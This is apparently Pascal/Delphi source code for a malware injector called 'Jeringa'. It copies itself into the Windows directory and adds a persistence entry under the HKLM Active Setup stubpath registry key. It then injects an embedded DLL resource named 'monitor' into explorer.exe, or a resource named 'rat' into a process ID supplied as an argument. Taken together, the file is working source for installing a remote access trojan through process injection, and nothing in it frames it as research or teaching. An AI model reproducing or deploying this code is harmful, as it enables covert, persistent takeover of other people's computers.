program Jeringa;

uses
  ShellApi,
  Windows,
  minireg,
  lomlib,
  TlHelp32,
  afxCodeHook;

{$R MyRes.res}

function WinDir: string;
var
  intLen:    integer;
  strBuffer: string;
begin
  SetLength(strBuffer, 1000);
  intLen := GetWindowsDirectory(PChar(strBuffer), 1000);
  Result := (Copy(strBuffer, 1, intLen));
  if Result[Length(Result) - 1] <> '\' then
    Result := Result + '\';
end;

  function GetProcessID(sProcName: string): integer;
  var
    hProcSnap: THandle;
    pe32:      TProcessEntry32;
  begin
    Result    := -1;
    hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
    if hProcSnap = INVALID_HANDLE_VALUE then
      Exit;
    pe32.dwSize := SizeOf(ProcessEntry32);
    if Process32First(hProcSnap, pe32) = True then
      while Process32Next(hProcSnap, pe32) = True do
        if pos(sProcName, LowerCase(pe32.szExeFile)) > 0 then
          Result := pe32.th32ProcessID;
  end;


  procedure Inject(ResName: string; pid: dword);
  var
    ResourceLocation: HRSRC;
    ResourceSize:     longword;
    ResourceHandle:   THandle;
    ResourcePointer:  Pointer;
    //pid: dword;
    handleWindow:     integer;
  begin

    //ResourceLocation := FindResource(HInstance, pchar('mi_dll'), RT_RCDATA);
    ResourceLocation := FindResource(SysInit.HInstance, PChar(ResName), 'DLL');
    //ShowMessage('es: '+IntTOStr(ResourceLocation));
    if ResourceLocation <> 0 then
    begin
      ResourceSize := SizeofResource(SysInit.HInstance, ResourceLocation);
      if ResourceSize <> 0 then
      begin
        ResourceHandle := LoadResource(SysInit.HInstance, ResourceLocation);
        if ResourceHandle <> 0 then
        begin
          ResourcePointer := LockResource(ResourceHandle);
          HandleWindow    := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
          InjectLibrary(HandleWindow, ResourcePointer);

        end;
      end;
    end;
  end;


var
  pid: dword;
begin
  if ParamCount = 0 then
  begin
    copyfile(PAnsiChar(ParamStr(0)), PAnsiChar(windir+'Jeringa.exe'), FALSE);
    ShellExecute(0, 'open', PAnsiChar(windir+'Jeringa.exe'),'monitor', PansiChar(extractFilePath(Paramstr(0))), SW_SHOWNORMAL);
    RegSetString(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Active Setup\Installed Components\{D3B930A4-76AC-11DD-82E7-913F56D89593}\stubpath', windir+'Jeringa.exe monitor');
  end
  else if ParamCount = 1 then
  begin
    PID := GetProcessID('explorer.exe');
//    while (PID = -1) do
//      PID := GetProcessID('explorer.exe');
    Inject('monitor', pid);
  end
  else if ParamCount = 2 then
  begin
    //ShowMessage('Debo Inyectar en: '+ParamStr(2));
    Inject('rat', StrToInt(ParamStr(2)));
  end;

end.
